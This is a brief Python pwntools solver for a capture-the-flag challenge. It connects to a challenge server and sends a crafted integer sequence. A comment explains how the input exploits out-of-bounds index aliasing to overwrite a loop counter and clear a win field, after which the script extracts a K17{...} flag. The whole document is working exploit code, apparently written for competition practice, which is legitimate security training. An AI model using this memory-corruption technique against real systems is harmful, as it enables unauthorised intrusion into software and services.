#!/usr/bin/env python3
import os
os.environ["TERM"]="xterm"
from pwn import *
context.log_level="info"

# Winning input: trigger accum==67 at i=6 (skip past bound), then abuse index-aliasing:
#   n[9]=accum, n[10]=i.  Write n[10]=-2 so i-> -1, then n[-1]=win field -> cleared.
SEQ = [0,0,0,0,0,0,67, 100, 500, -2, 0,0,0,0,0,0,0,0]

p = remote("chal.secso.cc", 4001)
p.sendline("\n".join(str(x) for x in SEQ).encode())
data = p.recvall(timeout=8).decode(errors="replace")
print("="*50)
print(data)
print("="*50)
import re
m = re.search(r"K17\{[^}]*\}", data)
if m:
    print("FLAG:", m.group())
p.close()
